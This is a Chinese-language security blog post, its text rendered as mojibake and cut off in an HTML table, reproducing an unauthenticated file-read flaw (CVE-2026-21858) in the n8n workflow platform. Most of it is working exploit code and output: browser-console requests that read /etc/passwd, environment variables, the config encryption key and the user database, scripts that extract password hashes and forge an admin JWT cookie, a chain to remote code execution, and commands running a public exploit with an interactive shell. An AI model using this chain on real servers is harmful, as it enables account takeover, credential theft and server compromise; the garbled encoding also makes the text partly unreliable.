#  CVE-2026-21858 å› ä¸å½“çš„ Webhook è¯·æ±‚å¤„ç†è€Œæ˜“å—æœªè®¤è¯æ–‡ä»¶è®¿é—®  
åŸåˆ› æ³·ç¾½Secé™å®‰
                        æ³·ç¾½Secé™å®‰  æ³·ç¾½Sec-é™å®‰   2026-01-15 10:04  
  
Â   
  
> å…³æ³¨**æ³·ç¾½Sec**  
å’Œ**æ³·ç¾½Sec-é™å®‰**  
å…¬ä¼—å·ï¼Œè¿™é‡Œä¼šå®šæœŸæ›´æ–°ä¸ OSCPã€æ¸—é€æµ‹è¯•ç­‰ç›¸å…³çš„æœ€æ–°æ–‡ç« ï¼Œå¸®åŠ©ä½ ç†è§£ç½‘ç»œå®‰å…¨é¢†åŸŸçš„æœ€æ–°åŠ¨æ€ã€‚  
  
## ğŸ”¬ æŠ€æœ¯åˆ†æ  
### æ¼æ´åŸç†  
  
N8N æ˜¯ä¸€ä¸ªå¼€æºçš„å·¥ä½œæµç¨‹è‡ªåŠ¨åŒ–å¹³å°ã€‚1.65.0 åŠä»¥ä¸‹ç‰ˆæœ¬å…è®¸æ”»å‡»è€…é€šè¿‡æ‰§è¡ŒæŸäº›åŸºäºè¡¨å•çš„å·¥ä½œæµç¨‹è®¿é—®åº•å±‚æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å·¥ä½œæµç¨‹å¯èƒ½è®©  
æœªè®¤è¯  
çš„è¿œç¨‹æ”»å‡»è€…è·å¾—è®¿é—®æƒé™ï¼Œå¯¼è‡´ç³»ç»Ÿä¸­å­˜å‚¨çš„æ•æ„Ÿä¿¡æ¯æš´éœ²ï¼Œå¹¶æ ¹æ®éƒ¨ç½²é…ç½®å’Œå·¥ä½œæµç¨‹ä½¿ç”¨æƒ…å†µï¼Œå¯èƒ½è¿›ä¸€æ­¥è¢«æ”»ç ´ã€‚è¿™ä¸ªé—®é¢˜åœ¨ 1.121.0 ç‰ˆæœ¬ä¸­ä¿®å¤äº†ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpIWIZKKMOfJuAydFsSicjBdhklxohSxiaPAic3bHd9tlTIuuiapo84xEyRA/640?wx_fmt=png&from=appmsg "null")  
  
  
ä¸[[CVE-2025-68613 n8n è¡¨è¾¾å¼æ²™ç®±é€ƒé€¸å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´]] è”åˆä½¿ç”¨å°±èƒ½ç›´æ¥æ—¥ç©¿n8nç³»ç»Ÿã€‚CVE-2025-68613 æ¼æ´è™½ç„¶å¯ä»¥RCEï¼Œä½†æ˜¯å‰ææ¡ä»¶æ˜¯çŸ¥é“n8nç³»ç»Ÿçš„ç™»å½•å¯†ç ï¼Œè€Œä¸”è¿™ä¸ªè´¦æˆ·è¿˜éœ€è¦æœ‰èŠ‚ç‚¹ç¼–è¾‘æƒé™ã€‚ä¹Ÿå°±æ˜¯å¿…é¡»ç™»å½•åˆ°ä¸‹å›¾è¿™æ ·èŠ‚ç‚¹ç¼–è¾‘çš„ç•Œé¢æ‰èƒ½æˆåŠŸæ‰§è¡Œï¼Œå¦‚æœä¸çŸ¥é“è´¦æˆ·å¯†ç ï¼Œæˆ–è€…ç™»å½•çš„è´¦æˆ·æ²¡æœ‰èŠ‚ç‚¹ç¼–è¾‘æƒé™çš„è¯å°±æ²¡åŠæ³•ï¼Œåªèƒ½å¹²çªçœ¼ã€‚è¿™æ—¶å€™CVE-2026-2185æ¥äº†ï¼Œè¿™ä¸ªæ¼æ´å¯ä»¥åœ¨ä¸ç™»é™†çš„æƒ…å†µä¸‹ï¼Œè·å¾—ç³»ç»Ÿä¸€äº›æ•æ„Ÿæ–‡ä»¶çš„è¯»å–æƒé™ï¼Œä»è€Œè®¿é—®æ¯”å¦‚Â /etc/passwd  
Â è¿™æ ·çš„æ–‡ä»¶è·å¾—å¯†ç ã€‚ä»è€Œå®ç°å®Œæ•´çš„æ”»å‡»é“¾æ¡ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bp52RKic2drRB7Pq53HXKUEdLAxsrMEGy461tQZuHMbG9aUdIgicQYUgDQ/640?wx_fmt=png&from=appmsg "null")  
  
## ğŸ’£ æ¼æ´å¤ç°  
### ç¯å¢ƒæ­å»º  
  
docker-compose.yml  
æ–‡ä»¶å¦‚ä¸‹  
```
services:
Â  n8n:
Â  Â  build: .
Â  Â  container_name: n8n-vulnerable
Â  Â  ports:
Â  Â  Â  -Â "5678:5678"
Â  Â  environment:
Â  Â  Â  - N8N_SECURE_COOKIE=false
Â  Â  Â  - WEBHOOK_URL=http://localhost:5678/
Â  Â  volumes:
Â  Â  Â  - ./init:/init:roÂ  Â  entrypoint: >
Â  Â  Â  bash -cÂ "Â  Â  Â  Â  apt-get update && apt-get install -y curl > /dev/null 2>&1Â  Â  Â  Â  n8n start &Â  Â  Â  Â  sleep 15Â  Â  Â  Â  bash /init/setup.shÂ  Â  Â  Â  waitÂ  Â  Â  "
```  
  
Dockerfile  
æ–‡ä»¶å¦‚ä¸‹  
```
FROMÂ node:20-slimRUNÂ npm install -g n8n@1.65.0EXPOSEÂ 5678CMDÂ ["n8n",Â "start"]
```  
  
æ­å»ºç¯å¢ƒ  
```
docker compose up -d#Â Wait ~60 secondsÂ forÂ setup#Â Form: http://localhost:5678/form/vulnerable-form#Â Creds: admin@exploit.local / password
```  
> æ³¨æ„ï¼ŒçœŸå®æ¸—é€å¹¶ä¸éœ€è¦å¯†ç ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bpg4r1ffoSjoPWjISqlATxfGFDzbsRlhrc01fuxYHM06ranNgpxrch9w/640?wx_fmt=png&from=appmsg "null")  
  
### åˆ©ç”¨æ­¥éª¤  
  
æ‰“å¼€ http://IP:5678/form/vulnerable-form çœ‹å¾—åˆ°ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„çª—å£ï¼Œå¹¶æ²¡æœ‰ä»»ä½•ç™»å½•éªŒè¯çš„è¿‡ç¨‹ï¼Œæ‰“å¼€å°±çœ‹å¾—åˆ°ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpFUXBd95axSILU27OY1qRo3iak64qeY5hpEnu09xXAVicYTBz7q7ZkYog/640?wx_fmt=png&from=appmsg "null")  
  
  
éšä¾¿ç©¿ä¸€ä¸ªå›¾ç‰‡å°±çœ‹åˆ°æ˜¾ç¤ºå¦‚æ­¤  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpXEsVgt0otomRMeVoOANtibgicibibkQgVFQbbiaDQFiafGWq8xicg3wN4kJ8g/640?wx_fmt=png&from=appmsg "null")  
  
#### å®Œæ•´çš„çº¯æ‰‹åŠ¨åˆ©ç”¨æ­¥éª¤  
##### ç¬¬ä¸€æ­¥ï¼šè§¦å‘ä»»æ„æ–‡ä»¶è¯»å–  
  
æŒ‰F12æ‰“å¼€æ§åˆ¶å°Consoleè¾“å…¥å¦‚ä¸‹å†…å®¹  
```
fetch('http://target-ip:5678/form/vulnerable-form', {Â  method:Â 'POST',Â  headers: {'Content-Type':Â 'application/json'},Â  body:Â JSON.stringify({Â  Â  data: {},Â  Â  files: {Â  Â  Â  test: {Â  Â  Â  Â  filepath:Â '/etc/passwd',Â  Â  Â  Â  originalFilename:Â 'test.txt',Â  Â  Â  Â  mimetype:Â 'text/plain',Â  Â  Â  Â  size:Â 100
Â  Â  Â  }
Â  Â  }
Â  })
})
.then(rÂ =>Â r.text())
.then(console.log)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bp3SOkxT6XXhB0UsiaHuIbBccWgFibaczbEHUzb0cOplUSSzCeR98Nc16A/640?wx_fmt=png&from=appmsg "null")  
  
  
ç¡®è®¤ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å­˜åœ¨ï¼Œç„¶åè¯»å–è®¡ç®—jwtæ‰€éœ€çš„æ–‡ä»¶ã€‚  
```
// 1. è¯»å–ç¯å¢ƒå˜é‡è·å–HOMEç›®å½•fetch('http://target-ip:5678/form/vulnerable-form', {Â  method:Â 'POST',Â  headers: {'Content-Type':Â 'application/json'},Â  body:Â JSON.stringify({Â  Â  data: {},Â  Â  files: {Â  Â  Â  test: {Â  Â  Â  Â  filepath:Â '/proc/self/environ',Â  Â  Â  Â  originalFilename:Â 'environ.txt',Â  Â  Â  Â  mimetype:Â 'text/plain',Â  Â  Â  Â  size:Â 1000
Â  Â  Â  }
Â  Â  }
Â  })
})
.then(rÂ =>Â r.text())
.then(dataÂ =>Â {Â  console.log('ç¯å¢ƒå˜é‡:', data);Â  // ä»è¾“å‡ºä¸­æ‰¾åˆ° HOME=/home/node æˆ– HOME=/root
});// å¯èƒ½çš„é…ç½®æ–‡ä»¶è·¯å¾„constÂ configPaths = [Â  '/home/node/.n8n/config',Â  '/root/.n8n/config',Â  '/.n8n/config'
];// å°è¯•è¯»å–é…ç½®asyncÂ functionÂ readConfig() {Â  forÂ (constÂ pathÂ ofÂ configPaths) {Â  Â  tryÂ {Â  Â  Â  constÂ response =Â awaitÂ fetch('http://target-ip:5678/form/vulnerable-form', {Â  Â  Â  Â  method:Â 'POST',Â  Â  Â  Â  headers: {'Content-Type':Â 'application/json'},Â  Â  Â  Â  body:Â JSON.stringify({Â  Â  Â  Â  Â  data: {},Â  Â  Â  Â  Â  files: {Â  Â  Â  Â  Â  Â  config: {Â  Â  Â  Â  Â  Â  Â  filepath: path,Â  Â  Â  Â  Â  Â  Â  originalFilename:Â 'config.json',Â  Â  Â  Â  Â  Â  Â  mimetype:Â 'application/json',Â  Â  Â  Â  Â  Â  Â  size:Â 10000
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  }
Â  Â  Â  Â  })
Â  Â  Â  });Â  Â  Â Â Â  Â  Â  constÂ text =Â awaitÂ response.text();Â  Â  Â  ifÂ (!text.includes('error') && !text.includes('could not be started')) {Â  Â  Â  Â  console.log(`æˆåŠŸè¯»å–Â ${path}:`, text);Â  Â  Â  Â  returnÂ text;
Â  Â  Â  }
Â  Â  }Â catchÂ (e) {Â  Â  Â  console.log(`è¯»å–Â ${path}Â å¤±è´¥:`, e);
Â  Â  }
Â  }
}readConfig();// æ–¹æ³•1: å°è¯•ä»¥æ–‡æœ¬å½¢å¼è¯»å–ï¼ˆSQLiteæœ‰äº›éƒ¨åˆ†æ˜¯å¯è¯»æ–‡æœ¬ï¼‰fetch('http://target-ip:5678/form/vulnerable-form', {Â  method:Â 'POST',Â  headers: {'Content-Type':Â 'application/json'},Â  body:Â JSON.stringify({Â  Â  data: {},Â  Â  files: {Â  Â  Â  db: {Â  Â  Â  Â  filepath:Â '/root/.n8n/database.sqlite',Â  Â  Â  Â  originalFilename:Â 'database.txt',Â  Â  Â  Â  mimetype:Â 'text/plain',Â  // æ”¹ä¸ºtext/plainÂ  Â  Â  Â  size:Â 500000
Â  Â  Â  }
Â  Â  }
Â  })
})
.then(rÂ =>Â r.text())
.then(dataÂ =>Â {Â  console.log('æ•°æ®åº“å†…å®¹ï¼ˆå¯èƒ½æ˜¯äºŒè¿›åˆ¶+æ–‡æœ¬æ··åˆï¼‰:', data);Â Â Â  // å°è¯•æå–é‚®ç®±åœ°å€ï¼ˆé€šå¸¸æ˜¯å¯è¯»æ–‡æœ¬ï¼‰Â  constÂ emailMatches = data.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);Â  console.log('æ‰¾åˆ°çš„é‚®ç®±:', emailMatches);Â Â Â  // å°è¯•æå–bcryptå¯†ç å“ˆå¸ŒÂ  constÂ bcryptMatches = data.match(/\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}/g);Â  console.log('æ‰¾åˆ°çš„å¯†ç å“ˆå¸Œ:', bcryptMatches);Â Â Â  // å°è¯•æå–UUIDï¼ˆç”¨æˆ·IDï¼‰Â  constÂ uuidMatches = data.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi);Â  console.log('æ‰¾åˆ°çš„UUID:', uuidMatches);
});
```  
  
å¾—åˆ°  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpSRdxCF4l5ecHJOhEm7HtUCBDWSHkluULvBPkMGjqX8zReAnovyNqeA/640?wx_fmt=png&from=appmsg "null")  
  
```
ç¯å¢ƒå˜é‡: HOSTNAME=0f0c3e315f95 YARN_VERSION=1.22.22 PWD=/ HOME=/root WEBHOOK_URL=http://localhost:5678/ SHLVL=0 N8N_SECURE_COOKIE=false PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NODE_VERSION=20.20.0 _=/usr/local/bin/n8nÂ 

æˆåŠŸè¯»å– /root/.n8n/config: {
Â  Â  "encryptionKey": "HPWNSjHN1dX8WP1jMV50XnxQgJURAY1G"
}

æ‰¾åˆ°çš„é‚®ç®±: (3) ['admin@exploit.local', '%36aec5f0-fd9e-4638-a245-468225f23a17admin@exploit.localAdminExploit', 'admin@exploit.local']
VM41:27 æ‰¾åˆ°çš„å¯†ç å“ˆå¸Œ: ['$2a$10$FO6DWFDRWkm3elPpgbHY0ul7syAml1zTq4UEBYKr8bXgjHFU6FSM2']
VM41:31 æ‰¾åˆ°çš„UUID: (7) ['0a8aee21-505e-4b4b-9277-957028c62991', '113cf64e-837c-44aa-83f3-5244ee446eac', '36aec5f0-fd9e-4638-a245-468225f23a17', '36aec5f0-fd9e-4638-a245-468225f23a17', '36aec5f0-fd9e-4638-a245-468225f23a17', '36aec5f0-fd9e-4638-a245-468225f23a17', '36aec5f0-fd9e-4638-a245-468225f23a17']
```  
##### ç¬¬äºŒæ­¥ï¼šæ‰‹åŠ¨ä¼ªé€ JWTä»¤ç‰Œ  
  
æå–åˆ°çš„å…³é”®ä¿¡æ¯  
```
encryptionKey: HPWNSjHN1dX8WP1jMV50XnxQgJURAY1G
userId: 36aec5f0-fd9e-4638-a245-468225f23a17 (å‡ºç°5æ¬¡ï¼Œæ˜æ˜¾æ˜¯ç®¡ç†å‘˜)
email: admin@exploit.local
passwordHash: $2a$10$FO6DWFDRWkm3elPpgbHY0ul7syAml1zTq4UEBYKr8bXgjHFU6FSM2
```  
###### æ–¹æ³•ä¸€ï¼šä½¿ç”¨æµè§ˆå™¨å®ŒæˆJWTä¼ªé€ ï¼ˆçº¯æ‰‹åŠ¨ï¼‰  
  
åœ¨æµè§ˆå™¨æ§åˆ¶å°è¿è¡Œä»¥ä¸‹ä»£ç ï¼š  
```
// ç¬¬1æ­¥ï¼šåŠ è½½crypto-jsåº“constÂ script =Â document.createElement('script');
script.srcÂ =Â 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';document.head.appendChild(script);// ç¬¬2æ­¥ï¼šç­‰å¾…3ç§’åè¿è¡ŒJWTç”Ÿæˆä»£ç setTimeout(() =>Â {Â  // å·²çŸ¥ä¿¡æ¯Â  constÂ encryptionKey =Â "HPWNSjHN1dX8WP1jMV50XnxQgJURAY1G";Â  constÂ userId =Â "36aec5f0-fd9e-4638-a245-468225f23a17";Â  constÂ email =Â "admin@exploit.local";Â  constÂ passwordHash =Â "$2a$10$FO6DWFDRWkm3elPpgbHY0ul7syAml1zTq4UEBYKr8bXgjHFU6FSM2";Â Â Â  // æ´¾ç”ŸJWT secretï¼ˆå–å¶æ•°ä½å­—ç¬¦ï¼‰Â  letÂ extracted =Â '';Â  forÂ (letÂ i =Â 0; i < encryptionKey.length; i +=Â 2) {
Â  Â  extracted += encryptionKey[i];
Â  }Â  constÂ jwtSecret =Â CryptoJS.SHA256(extracted).toString();Â  console.log('ğŸ”‘ JWT Secret:', jwtSecret);Â Â Â  // è®¡ç®—JWT hashÂ  constÂ combined = email +Â ':'Â + passwordHash;Â  constÂ sha256Hash =Â CryptoJS.SHA256(combined);Â  constÂ base64Hash = sha256Hash.toString(CryptoJS.enc.Base64);Â  constÂ jwtHash = base64Hash.substring(0,Â 10);Â  console.log('ğŸ” JWT Hash:', jwtHash);Â Â Â  // æ„é€ JWT Headerå’ŒPayloadÂ  constÂ header = {alg:Â "HS256",Â typ:Â "JWT"};Â  constÂ payload = {id: userId,Â hash: jwtHash};Â Â Â  // Base64URLç¼–ç Â  constÂ base64urlEncodeÂ = (obj) => {Â  Â  returnÂ btoa(JSON.stringify(obj))
Â  Â  Â  .replace(/\+/g,Â '-')
Â  Â  Â  .replace(/\//g,Â '_')
Â  Â  Â  .replace(/=/g,Â '');
Â  };Â Â Â  constÂ headerB64 =Â base64urlEncode(header);Â  constÂ payloadB64 =Â base64urlEncode(payload);Â Â Â  // è®¡ç®—ç­¾åÂ  constÂ message = headerB64 +Â '.'Â + payloadB64;Â  constÂ signature =Â CryptoJS.HmacSHA256(message, jwtSecret)
Â  Â  .toString(CryptoJS.enc.Base64)
Â  Â  .replace(/\+/g,Â '-')
Â  Â  .replace(/\//g,Â '_')
Â  Â  .replace(/=/g,Â '');Â Â Â  // å®Œæ•´JWTÂ  constÂ token = message +Â '.'Â + signature;Â  console.log('âœ… JWT Token:', token);Â Â Â  // è®¾ç½®Cookieï¼ŒIPæ”¹æˆé¶æœºçš„IPÂ  document.cookieÂ =Â `n8n-auth=${token}; path=/; domain=target-ip`;Â Â  console.log('ğŸª Cookieå·²è®¾ç½®ï¼');Â  console.log('ğŸ“ ç°åœ¨è®¿é—®: http://target-ip:5678/');Â Â Â  // è‡ªåŠ¨è·³è½¬Â  setTimeout(() =>Â {Â  Â  window.location.hrefÂ =Â 'http://target-ip:5678/';
Â  },Â 1000);
Â Â 
},Â 3000);
```  
  
ç›´æ¥å°±è¿›æ¥äº†ï¼Œéƒ½ä¸ç”¨è¾“å…¥å¯†ç ç™»å½•ã€‚  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpYpchtT0WEoYmPudptw3PRAAiaibbnWfxf7jkCaugic92OUaEjm2gFNo3A/640?wx_fmt=png&from=appmsg "null")  
  
###### æ–¹æ³•äºŒï¼šä½¿ç”¨åœ¨çº¿Pythonå·¥å…·  
  
å¦‚æœæµè§ˆå™¨æ–¹æ³•æœ‰é—®é¢˜ï¼Œè®¿é—® https://www.online-python.com/ å¹¶è¿è¡Œï¼š  
```
importÂ hashlibimportÂ base64importÂ hmacimportÂ json# å·²çŸ¥ä¿¡æ¯
encryption_key =Â "HPWNSjHN1dX8WP1jMV50XnxQgJURAY1G"
user_id =Â "36aec5f0-fd9e-4638-a245-468225f23a17"
email =Â "admin@exploit.local"
password_hash =Â "$2a$10$FO6DWFDRWkm3elPpgbHY0ul7syAml1zTq4UEBYKr8bXgjHFU6FSM2"# æ­¥éª¤1: æ´¾ç”ŸJWT secretï¼ˆå–å¶æ•°ä½å­—ç¬¦ï¼‰
extracted = encryption_key[::2]
jwt_secret = hashlib.sha256(extracted.encode()).hexdigest()print(f"JWT Secret:Â {jwt_secret}")# æ­¥éª¤2: è®¡ç®—JWT hash
combined =Â f"{email}:{password_hash}"
jwt_hash_full = base64.b64encode(hashlib.sha256(combined.encode()).digest()).decode()
jwt_hash = jwt_hash_full[:10]print(f"JWT Hash:Â {jwt_hash}")# æ­¥éª¤3: æ„é€ JWTdefÂ base64url_encode(data):Â  Â  returnÂ base64.urlsafe_b64encode(data).decode().rstrip('=')# Header
header = {"alg":Â "HS256",Â "typ":Â "JWT"}
header_b64 = base64url_encode(json.dumps(header, separators=(',',Â ':')).encode())# Payload
payload = {"id": user_id,Â "hash": jwt_hash}
payload_b64 = base64url_encode(json.dumps(payload, separators=(',',Â ':')).encode())# Signature
message =Â f"{header_b64}.{payload_b64}"
signature_bytes = hmac.new(jwt_secret.encode(), message.encode(), hashlib.sha256).digest()
signature = base64.urlsafe_b64encode(signature_bytes).decode().rstrip('=')# å®Œæ•´JWT
jwt_token =Â f"{header_b64}.{payload_b64}.{signature}"print(f"\n=== å¤åˆ¶ä¸‹é¢çš„JWT Token ===")print(jwt_token)print(f"\n=== è®¾ç½®Cookieå‘½ä»¤ ===")print(f"document.cookie = \"n8n-auth={jwt_token}; path=/\";")
```  
  
è¿è¡Œç»“æœ  
```
JWT Secret: 16d04397ec90148196f72aa9cd5e6c84bf04f693a9244a148384043fc98f4b9d Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
JWT Hash: ncMgzO+zwP

=== å¤åˆ¶ä¸‹é¢çš„JWT Token ===
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjM2YWVjNWYwLWZkOWUtNDYzOC1hMjQ1LTQ2ODIyNWYyM2ExNyIsImhhc2giOiJuY01nek8rendQIn0.N0P9jTH-n1qFtZcgA9THAivy-ISh6uQ22nH2qHToqnQ

=== è®¾ç½®Cookieå‘½ä»¤ ===
document.cookie = "n8n-auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjM2YWVjNWYwLWZkOWUtNDYzOC1hMjQ1LTQ2ODIyNWYyM2ExNyIsImhhc2giOiJuY01nek8rendQIn0.N0P9jTH-n1qFtZcgA9THAivy-ISh6uQ22nH2qHToqnQ; path=/";
```  
  
æµè§ˆå™¨æ§åˆ¶å°è¾“å…¥å‘½ä»¤å³å¯ç™»å½•åˆ°å·¥ä½œæµç•Œé¢ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bpfhb4xXcFlR6Ia0WXxoDKeLoiaOO1ic0QAw24URBO4aBaXibPVAXBZicicPw/640?wx_fmt=png&from=appmsg "null")  
  
###### æ–¹æ³•ä¸‰ï¼šæ‰‹åŠ¨åœ¨æµè§ˆå™¨è®¾ç½®Cookie  
  
å¦‚æœä¸Šé¢çš„è‡ªåŠ¨è·³è½¬ä¸workï¼Œæ‰‹åŠ¨è®¾ç½®ï¼š  
1. 1. æ‰“å¼€æµè§ˆå™¨æ§åˆ¶å°  
  
1. 2. è¿è¡Œä¸Šé¢çš„ä»£ç è·å–JWT token  
  
1. 3. æ‰‹åŠ¨è®¾ç½®cookieï¼š  
  
```
// å°†è¿™é‡Œçš„TOKENæ›¿æ¢ä¸ºç”Ÿæˆçš„JWTdocument.cookieÂ =Â "n8n-auth=TOKEN_HERE; path=/; domain=target-ip";// ç„¶åè®¿é—®window.location.hrefÂ =Â 'http://target-ip:5678/';
```  
##### ç¬¬ä¸‰æ­¥ï¼šé€šè¿‡Webç•Œé¢æ‰‹åŠ¨åˆ›å»ºRCEå·¥ä½œæµ  
  
åˆ°è¿™ä¸€æ­¥å°±å¯ä»¥ç”¨[[CVE-2025-68613 n8n è¡¨è¾¾å¼æ²™ç®±é€ƒé€¸å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´]] çš„æ–¹æ³•äº†ï¼Œå°±å’Œè€æ´ç»“åˆèµ·æ¥äº†ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpQ79p3e4bFutJ68aiaLAX12mlFzzP6WQfGTONyrFkYFTqzXke0JXzhAw/640?wx_fmt=png&from=appmsg "null")  
  
#### æ‰‹åŠ¨åˆ©ç”¨æ€»ç»“  
  
**å®Œå…¨æ‰‹åŠ¨å¯è¡Œçš„éƒ¨åˆ†**  
ï¼š  
- â€¢ âœ… æ–‡ä»¶è¯»å–ï¼ˆæµè§ˆå™¨æ§åˆ¶å° + fetchï¼‰  
  
- â€¢ âœ… æ•°æ®åº“åˆ†æï¼ˆåœ¨çº¿SQLiteå·¥å…·ï¼‰  
  
- â€¢ âš ï¸ JWTä¼ªé€ ï¼ˆéœ€è¦Pythonæˆ–åœ¨çº¿å·¥å…·è¾…åŠ©ï¼‰  
  
- â€¢ âœ… å·¥ä½œæµåˆ›å»ºï¼ˆWebç•Œé¢ç‚¹å‡»æ“ä½œï¼‰  
  
- â€¢ âœ… RCEè§¦å‘ï¼ˆæµè§ˆå™¨æ§åˆ¶å° + fetchï¼‰  
  
**å…³é”®ç‚¹**  
ï¼šJWTä¼ªé€ æ˜¯å”¯ä¸€éœ€è¦ç¼–ç¨‹è¾…åŠ©çš„æ­¥éª¤ï¼Œä½†å¯ä»¥ç”¨åœ¨çº¿Pythonè§£é‡Šå™¨ï¼ˆå¦‚ https://replit.com/ æˆ–Â   
https://www.online-python.com/ï¼‰å®Œæˆï¼Œä¸éœ€è¦æœ¬åœ°å®‰è£…ä»»ä½•å·¥å…·ã€‚[1]  
#### å…¨è‡ªåŠ¨è‡ªåŠ¨è„šæœ¬  
```
#Â æ‹‰å–poc
git clone https://github.com/Chocapikk/CVE-2026-21858.git#Â è¯»å–æ–‡ä»¶
python exploit.py http://localhost:5678 /form/vulnerable-form --read /etc/passwd#Â åŒCVEçš„RCEåˆ©ç”¨
python exploit.py http://localhost:5678 /form/vulnerable-form --cmd "id"#Â äº¤äº’å¼shell
python exploit.py http://localhost:5678 /form/vulnerable-form
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpKxreiccaDiaDY5qIvTibq8icn0NicNbHJf0ib4PcibWK2GT1NnqAqo4zs5EPA/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpTe1X3nzicoQk3icprshSGibvcoLMibXaTKN4vPnWicXzdyD0HPHGKvcEPRg/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bpa2dRHsoAtSj7uHQyBc25jEibo0HPwDAFcU5CRwcsVFvQuXCice5hVHog/640?wx_fmt=png&from=appmsg "null")  
  
## ğŸ“‹ CVE-2026-21858 æ¼æ´åˆ©ç”¨çš„å¿…è¦æ¡ä»¶  
### âš ï¸ é‡è¦å£°æ˜  
  
**è¿™ä¸æ˜¯ä¸€ä¸ª"ä¸‡èƒ½"çš„ n8n æ¼æ´ï¼**  
Â å®ƒéœ€è¦ç›®æ ‡ç³»ç»Ÿæ»¡è¶³ç‰¹å®šçš„é…ç½®æ¡ä»¶æ‰èƒ½æˆåŠŸåˆ©ç”¨ã€‚  
## âœ… å¿…é¡»æ»¡è¶³çš„ 5 ä¸ªæ¡ä»¶  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">#</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">æ¡ä»¶</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">è¯´æ˜</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">æ£€æŸ¥æ–¹æ³•</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">1ï¸âƒ£</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span 